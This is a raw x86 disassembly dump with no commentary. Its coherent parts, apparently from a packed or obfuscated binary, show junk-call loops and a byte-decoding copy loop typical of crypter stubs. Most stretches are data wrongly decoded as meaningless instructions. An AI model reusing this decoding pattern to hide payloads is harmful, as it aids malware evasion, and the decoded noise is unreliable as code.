  402921:	or     DWORD PTR [ecx+0x254b4b9f],edi
  402927:	add    ch,BYTE PTR [ecx-0x76]
  40292a:	xor    BYTE PTR [eax+ebp*8+0x79b5f16e],dl
  402931:	and    ebx,DWORD PTR [bp-0x2c]
  402935:	mov    BYTE PTR ds:0x48cc82f0,al
  40293b:	outs   dx,DWORD PTR ds:[esi]
  40293c:	(bad)  
  40293d:	sub    al,0xcc
  40293f:	jmp    0x402956
  402941:	mov    ah,0x7a
  402943:	push   esp
  402944:	inc    bp
  402946:	retf   0x6507
  402949:	inc    esp
  40294a:	pop    edx
  40294b:	add    DWORD PTR [eax],eax
  40294d:	xchg   BYTE PTR [esi+0x7],ch
  402950:	dec    esp
  402951:	mov    WORD PTR [edx],?
  402953:	pop    ecx
  402954:	je     0x4029ca
  402956:	push   0xa1ec319c
  40295b:	aas    
  40295c:	out    dx,al
  40295d:	mov    al,0xe4
  40295f:	xlat   BYTE PTR ds:[ebx]
  402960:	ss push cs
  402962:	idiv   BYTE PTR [edi+0x7647876f]
  402968:	push   esi
  402969:	inc    ebx
  40296a:	add    al,0xf4
  40296c:	stos   DWORD PTR es:[edi],eax
  40296d:	repnz add esi,esi
  402970:	sar    DWORD PTR [esi+0x8],cl
  402973:	push   es
  402974:	push   ss
  402975:	(bad)  
  402976:	push   cs
  402977:	jns    0x402998
  402979:	jg     0x40297f
  40297b:	push   edx
  40297c:	aaa    
  40297d:	fdivr  QWORD PTR [eax+0x56]
  402980:	jnp    0x40293d
  402982:	and    eax,0x4cb0ee17
  402987:	cmp    ebp,ebp
  402989:	xchg   ebx,eax
  40298a:	jge    0x4029b7
  40298c:	lock pop esi
  40298e:	mov    ebp,0x8109b63b
  402993:	sti    
  402994:	mov    bh,BYTE PTR [ecx+0x57eb7c21]
  40299a:	stc    
  40299b:	ins    DWORD PTR es:[edi],dx
  40299c:	cmp    ch,bl
  40299e:	mov    ecx,0x6c79424a
  4029a3:	mov    esi,0x8400a215
  4029a8:	sar    BYTE PTR [eax-0x6b992c5e],cl
  4029ae:	ja     0x4029c5
  4029b0:	icebp  
  4029b1:	pop    ebp
  4029b2:	aas    
  4029b3:	add    DWORD PTR [edi],esp
  4029b5:	mov    ecx,0x79ea736b
  4029ba:	sub    esp,esp
  4029bc:	test   DWORD PTR [eax+0x77],ecx
  4029bf:	pop    esp
  4029c0:	adc    BYTE PTR [edi],0xa7
  4029c3:	dec    esp
  4029c4:	mov    gs,WORD PTR cs:[ebp+edi*2-0x576750da]
  4029cc:	sbb    eax,DWORD PTR [edx]
  4029ce:	rcl    BYTE PTR [eax+0x6e41955d],0x41
  4029d5:	xchg   edi,eax
  4029d6:	pop    ds
  4029d7:	call   0xc762:0xf015fcfd
  4029de:	mov    al,ds:0xfab01b4
  4029e3:	cmp    bl,BYTE PTR [ecx]
  4029e5:	mov    ah,0x1c
  4029e7:	shl    eax,1
  4029e9:	inc    ecx
  4029ea:	mov    dl,0x8a
  4029ec:	sahf   
  4029ed:	mov    dl,0x4
  4029ef:	(bad)  
  4029f0:	and    al,0x9b
  4029f2:	mov    dh,0xd6
  4029f4:	into   
  4029f5:	(bad)  
  4029f6:	aad    0xfe
  4029f8:	mov    esp,0x682cb29a
  4029fd:	int3   
  4029fe:	jo     0x4029a2
  402a00:	pop    ss
  402a01:	je     0x4029e9
  402a03:	push   ebx
  402a04:	mov    ah,0xd8
  402a06:	(bad)  
  402a07:	mov    esp,0x29503a0d
  402a0c:	mov    BYTE PTR [eax-0x55876200],0xb4
  402a13:	sbb    eax,0x51fafe09
  402a18:	and    DWORD PTR ds:0x434587,0x0
  402a22:	jmp    0x402a34
  402a27:	mov    edx,DWORD PTR ds:0x434587
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434587,edx
  402a34:	cmp    DWORD PTR ds:0x434587,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434587,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x4344e3
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434587,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434587
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434587,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x4344ff,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x43453b,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x434577,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x434577
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x434577,ecx
  402aac:	cmp    DWORD PTR ds:0x434577,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x434577,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43460f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x4345fb
  402ae8:	or     DWORD PTR ds:0x4345c7,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x4345b7,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x4345c3,0x434503
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	jno    0x402b47
  402b21:	pop    ds
  402b22:	out    0x73,al
  402b24:	or     DWORD PTR [esi+0x7e],edi
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402b24
  402b2c:	ins    DWORD PTR es:[edi],dx
  402b2d:	push   edx
  402b2e:	inc    edi
  402b2f:	xor    al,0x6
  402b31:	pop    edi
  402b32:	inc    ebx
  402b33:	aam    0x13
  402b35:	sub    dl,BYTE PTR [esi-0x11765199]
  402b3b:	push   edx
  402b3c:	or     eax,0xa9f39a81
  402b41:	mov    dl,0xee
  402b43:	fucom  st(5)
  402b45:	add    edi,DWORD PTR [edi]
  402b47:	bnd ja 0x402b91
  402b4a:	lds    edx,FWORD PTR [ebp+0x137ed57a]
  402b50:	and    dl,cl
  402b52:	sub    dh,BYTE PTR [ecx-0x4f47d85d]
  402b58:	jle    0x402b08
  402b5a:	sbb    al,0x81
  402b5c:	add    cl,BYTE PTR [edx+0x13160058]
  402b62:	(bad)  
  402b63:	adc    BYTE PTR [eax],al
  402b65:	loopne 0x402b06
  402b67:	sbb    ebp,DWORD PTR [ecx]
  402b69:	(bad)  
  402b6a:	add    eax,0xe089ddf6
  402b6f:	push   ss
  402b70:	and    BYTE PTR [edx],ah
  402b72:	mov    al,ds:0x7b0e06c6
  402b77:	(bad)  
  402b78:	jmp    0x315d0e8c
  402b7d:	add    esi,eax
  402b7f:	push   ds
  402b80:	cmp    DWORD PTR [edi],eax
  402b82:	cdq    
  402b83:	std    
  402b84:	mov    bh,0xf5
  402b86:	dec    edx
  402b87:	std    
  402b88:	(bad)  
  402b8a:	jge    0x402b17
  402b8c:	adc    al,0x6c
  402b8e:	inc    eax
  402b8f:	and    DWORD PTR [ecx],esp
  402b91:	add    bl,BYTE PTR [edi+0x5]
  402b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b95:	rcl    BYTE PTR [ebx],1
  402b97:	ficomp WORD PTR [esi]
  402b99:	xor    eax,0xbd486baa
  402b9e:	inc    edi
  402b9f:	cmp    esi,eax
  402ba1:	or     al,0x20
  402ba3:	dec    ebp
  402ba4:	sahf   
  402ba5:	pop    esp
  402ba6:	dec    edi
  402ba7:	ja     0x402b76
  402ba9:	les    ebp,FWORD PTR [eax-0x1545d12d]
  402baf:	daa    
  402bb0:	push   esi
  402bb1:	imul   ecx,DWORD PTR [edi+0x7bd50119],0x242a3be6
  402bbb:	stc    
  402bbc:	dec    eax
  402bbd:	or     edi,eax
  402bbf:	mov    al,ds:0xf9ec89ee
  402bc4:	dec    eax
  402bc5:	lods   al,BYTE PTR ds:[esi]
  402bc6:	idiv   cl
  402bc8:	enter  0xfae7,0x4c
  402bcc:	jmp    0xcf03cfcf
  402bd1:	inc    esi
  402bd2:	pop    esp
  402bd3:	pop    ebx
  402bd4:	add    eax,0xfb9481f
  402bd9:	std    
  402bda:	and    dl,bh
  402bdc:	add    bl,bh
  402bde:	shr    BYTE PTR [edx+0x4d],0x1b
  402be2:	and    esi,DWORD PTR [ecx]
  402be4:	xor    eax,0xa61458
  402be9:	in     al,0x33
  402beb:	std    
  402bec:	pop    esp
  402bed:	xchg   esp,eax
  402bee:	mov    ch,0x5b
  402bf0:	fild   WORD PTR [ebx+0xd]
  402bf3:	adc    al,0x4e
  402bf5:	pop    ebp
  402bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bf7:	push   0x830f40bb
  402bfc:	shr    BYTE PTR [esi-0x6ca43530],0x22
  402c03:	mov    ebx,0x4cee6654
  402c08:	jg     0x402c39
  402c0a:	stc    
  402c0b:	leave  
  402c0c:	cdq    
  402c0d:	js     0x402c7a
  402c0f:	sbb    DWORD PTR [ebp+0x58231a88],esi
  402c15:	or     eax,0x46793019
  402c1a:	cmc    
  402c1b:	lds    esp,FWORD PTR [ebx+0x11]
  402c1e:	fcmovu st,st(4)
  402c20:	leave  
  402c21:	xchg   ebx,eax
  402c22:	push   ss
  402c23:	inc    esi
  402c24:	mov    al,ds:0xf04b6afc
  402c29:	outs   dx,BYTE PTR ds:[esi]
  402c2a:	and    eax,0xd0215bc6
  402c2f:	push   ebp
  402c30:	in     eax,0x78
  402c32:	jge    0x402bd1
  402c34:	or     eax,0x84bcacec
  402c39:	out    dx,eax
  402c3a:	and    BYTE PTR [ecx+0x175bd10e],cl
  402c40:	and    DWORD PTR [ebx-0x56],ecx
  402c43:	dec    ebx
  402c44:	adc    BYTE PTR [edi-0x17],dh
  402c47:	cmp    ebx,DWORD PTR [ebx-0x29fc5edc]
  402c4d:	cmp    edi,edx
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434507,0x0
  402c5f:	mov    eax,ds:0x434507
  402c64:	inc    eax
  402c65:	mov    ds:0x434507,eax
  402c6a:	cmp    DWORD PTR ds:0x434507,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434507,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x4344e7,0x434613
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	push   0xffffff8f
  402ce8:	data16 (bad) 
  402cea:	adc    ecx,DWORD PTR [ebx]
  402cec:	jle    0x402d6c
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402d65
  402cf3:	or     al,0x85
  402cf5:	pop    ecx
  402cf6:	inc    esi
  402cf7:	cmp    ah,0xfe
  402cfa:	mov    ds:0xa069f5cc,al
  402cff:	in     eax,dx
  402d00:	cmp    BYTE PTR [esi],bl
  402d02:	jno    0x402d09
  402d04:	lock inc esp
  402d06:	mov    ds:0x140c5721,eax
  402d0b:	mov    ch,0x17
  402d0d:	clc    
  402d0e:	sbb    DWORD PTR [esi+0x55],esp
  402d11:	jg     0x402ccc
  402d13:	lods   al,BYTE PTR ds:[esi]
  402d14:	and    al,0x1a
  402d16:	add    DWORD PTR [edx-0xf],ebp
  402d19:	popf   
  402d1a:	popa   
  402d1b:	xchg   ecx,eax
  402d1c:	cli    
  402d1d:	dec    esp
  402d1e:	rcr    esi,0xc2
  402d21:	mov    al,ds:0xc5d48f06
  402d26:	mov    WORD PTR [ecx],fs
  402d28:	aam    0xde
  402d2a:	inc    edi
  402d2b:	mov    ebp,0x4ab2abf3
  402d30:	adc    ah,dh
  402d32:	test   DWORD PTR ds:0x8211ca0d,edx
  402d38:	mov    eax,ds:0x62ef60a5
  402d3d:	and    esp,DWORD PTR [edx]
  402d3f:	dec    ebp
  402d40:	xchg   esp,eax
  402d41:	mov    dl,0x49
  402d43:	(bad)  
  402d44:	hlt    
  402d45:	in     eax,dx
  402d46:	pop    esi
  402d47:	sub    esi,edi
  402d49:	fstp   TBYTE PTR [eax-0x10]
  402d4c:	stc    
  402d4d:	push   ebp
  402d4e:	push   cs
  402d4f:	test   DWORD PTR ds:0x1f853f97,eax
  402d55:	sbb    BYTE PTR [ebp+0x37665eab],ch
  402d5b:	adc    eax,0x7651d70a
  402d60:	(bad)  
  402d61:	mov    ?,WORD PTR [ecx-0x51]
  402d64:	ficom  WORD PTR [esp+ebx*4+0x67]
  402d68:	in     eax,dx
  402d69:	mov    ecx,0x69083dc7
  402d6e:	mov    bl,0xa5
  402d70:	adc    ebp,DWORD PTR [eax+0x75]
  402d73:	fnstsw WORD PTR [ebp+esi*2+0x3b5c5e17]
  402d7a:	cwde   
  402d7b:	pop    edi
  402d7c:	es daa 
  402d7e:	call   0x25a7:0x6449eb4f
  402d85:	ins    BYTE PTR es:[edi],dx
  402d86:	xchg   esp,eax
  402d87:	xor    cl,ah
  402d89:	adc    edx,DWORD PTR [eax+0x6c323d00]
  402d8f:	jmp    0x402d55
  402d91:	and    edx,DWORD PTR [edi]
  402d93:	lea    ebx,[edi]
  402d95:	sub    esp,DWORD PTR [edi-0x73]
  402d98:	xlat   BYTE PTR ds:[ebx]
  402d99:	ins    DWORD PTR es:[edi],dx
  402d9a:	jo     0x402d2e
  402d9c:	sahf   
  402d9d:	xchg   BYTE PTR [edi],bl
  402d9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402da0:	jne    0x402d32
  402da2:	push   esp
  402da3:	popa   
  402da4:	jnp    0x402d6a
  402da6:	jns    0x402d49
  402da8:	add    ebx,DWORD PTR [eax]
  402daa:	mov    BYTE PTR ds:0x49fbaa09,bl
  402db0:	or     al,0x9b
  402db2:	bnd call 0x66e7648b
  402db8:	sub    DWORD PTR es:[edx+0x7d],ecx
  402dbc:	cmp    BYTE PTR ds:0x5bb00aa1,ch
  402dc2:	je     0x402db4
  402dc4:	mov    esp,0xd7712775
  402dc9:	sub    BYTE PTR [esi+0x8c7179c],dl
  402dcf:	cmp    ebx,ecx
  402dd1:	(bad)
  402dd4:	cmp    edx,DWORD PTR [edi-0x3d]
  402dd7:	sbb    ecx,DWORD PTR [ecx]
  402dd9:	repnz gs stos BYTE PTR es:[edi],al
  402ddc:	daa    
  402ddd:	pusha  
  402dde:	aas    
  402ddf:	pushf  
  402de0:	mov    eax,ds:0xeeb30dee
  402de5:	daa    
  402de6:	or     BYTE PTR [ebp+0x1d],bh
  402de9:	jge    0x402dca
  402deb:	hlt    
  402dec:	dec    esp
  402ded:	into   
  402dee:	dec    edx
  402def:	aad    0x9a
  402df1:	push   ecx
  402df2:	and    eax,0x61e7ec47
  402df7:	popf   
  402df8:	or     bh,bl
  402dfa:	int    0xd0
  402dfc:	dec    ebp
  402dfd:	clc    
  402dfe:	sahf   
  402dff:	inc    edx
  402e00:	fild   DWORD PTR [esi]
  402e02:	bound  edi,QWORD PTR [ebp+0x5b]
  402e05:	jnp    0x402e40
  402e07:	jbe    0x402e7b
  402e09:	adc    al,0x5c
  402e0b:	loope  0x402e6a
  402e0d:	pop    ecx
  402e0e:	mov    es,WORD PTR [edi+0x5d8b778e]
  402e14:	or     al,0x33
  402e16:	rol    DWORD PTR [ebx],0xc2
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x434577,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    bl,BYTE PTR [ebx+0x3372c530]
  402e97:	adc    al,0x7e
  402e99:	jle    0x402ef1
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402e6e
  402e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ea0:	out    0xcd,al
  402ea2:	shl    bl,0x52
  402ea5:	sub    esi,esi
  402ea7:	aaa    
  402ea8:	mov    WORD PTR [ecx-0x44c10c13],?
  402eae:	cmp    BYTE PTR [edx],0x60
  402eb1:	mov    WORD PTR [eax+edx*4+0x22],ss
  402eb5:	fstp   st(7)
  402eb7:	pop    ebp
  402eb8:	cmp    al,bl
  402eba:	mov    edx,0x272701a9
  402ebf:	cld    
  402ec0:	sahf   
  402ec1:	mov    cl,cl
  402ec3:	add    esp,DWORD PTR [ecx]
  402ec5:	add    BYTE PTR [esi],ah
  402ec7:	mov    ebp,0xc2e5a290
  402ecc:	dec    ecx
  402ecd:	xchg   edi,eax
  402ece:	das    
  402ecf:	imul   ecx,eax,0x50bb69d
  402ed5:	push   es
  402ed6:	pushf  
  402ed7:	iret   
  402ed8:	fmul   QWORD PTR [esi-0x79be7865]
  402ede:	ins    DWORD PTR es:[edi],dx
  402edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ee0:	mov    cl,0x63
  402ee2:	ins    BYTE PTR es:[edi],dx
  402ee3:	dec    edx
  402ee4:	outs   dx,BYTE PTR ds:[esi]
  402ee5:	sub    BYTE PTR [ecx+0x69d7ded9],ah
  402eeb:	outs   dx,DWORD PTR ds:[esi]
  402eec:	into   
  402eed:	lock cmp al,0x62
  402ef0:	pop    esp
  402ef1:	outs   dx,BYTE PTR ds:[esi]
  402ef2:	cmc    
  402ef3:	add    al,0xc3
  402ef5:	in     al,dx
  402ef6:	xchg   ebx,eax
  402ef7:	mul    edi
  402ef9:	pop    es
  402efa:	fldenv [esi]
  402efc:	sub    cl,BYTE PTR [edi]
  402efe:	or     BYTE PTR [ecx+0x6f5398c7],cl
  402f04:	or     edi,DWORD PTR [eax-0x38ec5ea0]
  402f0a:	push   es
  402f0b:	pop    ecx
  402f0c:	cdq    
  402f0d:	cld    
  402f0e:	scas   eax,DWORD PTR es:[edi]
  402f0f:	adc    ecx,DWORD PTR [esi-0x62]
  402f12:	jl     0x402ec0
  402f14:	cld    
  402f15:	push   0x12
  402f17:	dec    esi
  402f18:	push   cs
  402f19:	outs   dx,BYTE PTR ds:[esi]
  402f1a:	lea    edi,[eax-0x35]
  402f1d:	loope  0x402eff
  402f1f:	jns    0x402f59
  402f21:	ins    BYTE PTR es:[edi],dx
  402f22:	outs   dx,DWORD PTR ds:[esi]
  402f23:	sbb    BYTE PTR [esi+0x15],ch
  402f26:	mov    edi,0x22444f00
  402f2b:	mov    bl,0xd4
  402f2d:	mov    eax,ds:0x7408f81a
  402f32:	loope  0x402f97
  402f34:	mov    dh,0x1c
  402f36:	jbe    0x402f30
  402f38:	shl    DWORD PTR [ebp-0x64],1
  402f3b:	jp     0x402f72
  402f3d:	call   0xde6fa3ed
  402f42:	enter  0x330b,0x62
  402f46:	shl    dh,1
  402f48:	sbb    eax,edi
  402f4a:	pop    edx
  402f4b:	mov    ebp,0x59bffd51
  402f50:	xor    BYTE PTR [eax],dl
  402f52:	jo     0x402f51
  402f54:	pop    eax
  402f55:	xchg   ebx,eax
  402f56:	les    esp,FWORD PTR [esi-0x48]
  402f59:	cli    
  402f5a:	mov    ah,0x32
  402f5c:	(bad)  ds:0xc51407f0
  402f62:	iret   
  402f63:	adc    ebx,DWORD PTR [esi-0x29]
  402f66:	jp     0x402f0e
  402f68:	out    dx,eax
  402f69:	in     al,dx
  402f6a:	cwde   
  402f6b:	dec    ebp
  402f6c:	das    
  402f6d:	mov    esi,0xf6e869e9
  402f72:	xchg   BYTE PTR [esi-0x62],dl
  402f75:	test   eax,0x598dbb11
  402f7a:	pop    eax
  402f7b:	or     BYTE PTR [ebp+0x70],dl
  402f7e:	add    DWORD PTR [esi-0x16250a8e],edi
  402f84:	shl    ecx,0x45
  402f87:	ret    
  402f88:	daa    
  402f89:	xor    ecx,DWORD PTR [edx]
  402f8b:	jns    0x402fe6
  402f8d:	mov    ds:0xcc7d3156,eax
  402f92:	pop    edx
  402f93:	cdq    
  402f94:	stos   BYTE PTR es:[edi],al
  402f95:	les    esi,FWORD PTR [edx+ecx*2-0x3782806c]
  402f9c:	cmp    esp,DWORD PTR [ecx+0x5d]
  402f9f:	shl    BYTE PTR [edx-0x212fe21f],0xd3
  402fa6:	iret   
  402fa7:	(bad)  
  402fa8:	mov    eax,gs:0x60ab0fee
  402fae:	xor    al,0x6d
  402fb0:	xchg   ebp,eax
  402fb1:	in     al,0xe
  402fb3:	call   0xba:0x2ee87b58
  402fba:	nop
  402fbb:	jmp    0x3a6bb9d7
  402fc0:	sbb    bh,ah
  402fc2:	mov    ecx,0x8ab87648
  402fc7:	std    
  402fc8:	stos   BYTE PTR es:[edi],al
  402fc9:	sub    al,0xc
  402fcb:	ss mov edi,0x1af24707
  402fd1:	int3   
  402fd2:	js     0x402fa4
  402fd4:	ret    
  402fd5:	cmc    
  402fd6:	inc    edx
  402fd7:	jb     0x402f6f
  402fd9:	loopne 0x40304b
  402fdb:	sub    DWORD PTR [edi-0x73d2ffdd],edi
  402fe1:	sbb    DWORD PTR [edx-0x48b8f108],ecx
  402fe7:	push   ds
  402fe8:	adc    al,0x68
  402fea:	lods   eax,DWORD PTR ds:[esi]
  402feb:	xchg   ebx,eax
  402fec:	xchg   cl,ch
  402fee:	cmp    al,0x24
  402ff0:	pop    esi
  402ff1:	das    
  402ff2:	dec    eax
  402ff3:	aaa    
  402ff4:	fs pop esp
  402ff6:	icebp  
  402ff7:	in     al,0x8e
  402ff9:	lds    ebx,FWORD PTR [ebx-0x46]
  402ffc:	sub    BYTE PTR [eax-0x20],cl
  402fff:	adc    al,ch
  403001:	rcl    BYTE PTR gs:[edi-0xd],1
  403005:	in     eax,dx
  403006:	outs   dx,BYTE PTR ds:[esi]
  403007:	int    0x60
  403009:	add    dl,BYTE PTR [edx-0x6b]
  40300c:	mov    bh,0x7b
  40300e:	sub    al,0x17
  403010:	scas   eax,DWORD PTR es:[edi]
  403011:	mov    ebx,0x4415530a
  403016:	stos   DWORD PTR es:[edi],eax
  403017:	es gs jae 0x403073
  40301b:	fiadd  DWORD PTR [eax-0x42bcd551]
  403021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403022:	pop    edx
  403023:	push   0xe4e85dd
  403028:	rcl    BYTE PTR [edi+0x733c5a90],cl
  40302e:	outs   dx,BYTE PTR ds:[esi]
  40302f:	push   ds
  403030:	call   0xd9c5:0xb3161f2d
  403037:	scas   eax,DWORD PTR es:[edi]
  403038:	fisubr DWORD PTR [edx+0x64]
  40303b:	adc    eax,0x5b4aa858
  403040:	and    eax,0x9ac82f0f
  403045:	mov    DWORD PTR [eax+0x73ac93d0],eax
  40304b:	lods   al,BYTE PTR ds:[esi]
  40304c:	or     cl,dh
  40304e:	push   edx
  40304f:	inc    ebp
  403050:	sbb    ch,ch
  403052:	fwait
  403053:	sub    eax,0x93a158fe
  403058:	fistp  QWORD PTR [ecx-0x5a76efb4]
  40305e:	push   esp
  40305f:	or     DWORD PTR [esp+edx*2],edi
  403062:	xchg   edx,eax
  403063:	imul   ecx,DWORD PTR [ebp-0x11],0xffffffc7
  403067:	and    eax,0x68b836ad
  40306c:	loop   0x4030d1
  40306e:	or     BYTE PTR [ebp-0x1ce183ad],ah
  403074:	xchg   edx,eax
  403075:	pop    esi
  403076:	sub    DWORD PTR [edi-0x41],edx
  403079:	aam    0xfa
  40307b:	loope  0x403037
  40307d:	lea    ebp,[ebp-0x578ff56e]
  403083:	enter  0xe940,0x21
  403087:	mov    ch,0x43
  403089:	xchg   edx,eax
  40308a:	mov    dl,BYTE PTR [ebx-0x65d786ee]
  403090:	pusha  
  403091:	imul   eax,DWORD PTR [edx+0x27],0x6e
  403095:	in     eax,0xc7
  403097:	jge    0x40302c
  403099:	push   cs
  40309a:	sub    al,0xb8
  40309c:	in     al,dx
  40309d:	arpl   WORD PTR [esi],cx
  40309f:	fmul   st,st(1)
  4030a1:	dec    edi
  4030a2:	inc    esp
  4030a3:	ja     0x403055
  4030a5:	aad    0x9f
  4030a7:	(bad)  
  4030a8:	loope  0x4030ca
  4030aa:	and    esi,edi
  4030ac:	bound  edi,QWORD PTR [ebp-0x6]
  4030af:	gs mov bl,0x16
  4030b2:	adc    DWORD PTR [eax],0x39
  4030b5:	in     eax,0xe2
  4030b7:	repz fnsave [ebx-0x12]
  4030bb:	ret    
  4030bc:	int    0x8
  4030be:	loop   0x403136
  4030c0:	add    DWORD PTR [ecx-0x31],eax
  4030c3:	retf   
  4030c4:	jns    0x40309a
  4030c6:	inc    ebp
  4030c7:	mov    al,0xf6
  4030c9:	addr16 dec ebx
  4030cb:	sub    al,0x2c
  4030cd:	in     eax,dx
  4030ce:	xchg   edx,eax
  4030cf:	das    
  4030d0:	out    0xb8,eax
  4030d2:	xchg   esp,eax
  4030d3:	mov    ecx,0xc26894c7
  4030d8:	jne    0x4030fe
  4030da:	jp     0x40314e
  4030dc:	sahf   
  4030dd:	jl     0x40306f
  4030df:	popa   
  4030e0:	push   0x1edb853b
  4030e5:	iret   
  4030e6:	adc    bl,dh
  4030e8:	iret   
  4030e9:	nop
  4030ea:	sub    BYTE PTR [edi+eax*4-0x6b],ah
  4030ee:	cmc    
  4030ef:	push   cs
  4030f0:	sub    eax,0xb422445
  4030f5:	sub    bh,ch
  4030f7:	cwde   
  4030f8:	enter  0x103,0x43
  4030fc:	jmp    0x6afe:0x3c2a4419
  403103:	popf   
  403104:	mov    dh,0x5b
  403106:	js     0x4030c5
  403108:	inc    edx
  403109:	push   edx
  40310a:	aam    0x6
  40310c:	stc    
  40310d:	sahf   
  40310e:	add    DWORD PTR ds:0x1fd45689,esi
  403114:	cmp    edi,DWORD PTR [esi-0x70a3af41]
  40311a:	outs   dx,DWORD PTR ds:[esi]
  40311b:	push   eax
  40311c:	fild   QWORD PTR [eax+0x21]
  40311f:	adc    al,0xc
  403121:	lea    ebx,[ecx+eax*4]
  403124:	in     al,0x44
  403126:	(bad)  
  403127:	in     eax,dx
  403128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403129:	in     eax,dx
  40312a:	pop    eax
  40312b:	rol    esi,0x1d
  40312e:	mov    al,ds:0x593beb99
  403133:	sti    
  403134:	push   eax
  403135:	in     al,0x53
  403137:	lea    ecx,[ecx-0x4eceb404]
  40313d:	(bad)  
  40313e:	or     al,0xbf
  403140:	lds    ecx,FWORD PTR [esi]
  403142:	jg     0x40318a
  403144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403145:	xor    bl,BYTE PTR [ebx]
  403147:	cmp    al,0x58
  403149:	pop    DWORD PTR ds:0xfa842718
  40314f:	adc    eax,0x65b98bf5
  403154:	loope  0x403142
  403156:	ins    DWORD PTR es:[edi],dx
  403157:	and    eax,ecx
  403159:	mov    edx,0xdd650bc9
  40315e:	icebp  
  40315f:	cmp    edi,DWORD PTR [eax-0x64]
  403162:	pop    eax
  403163:	inc    ebp
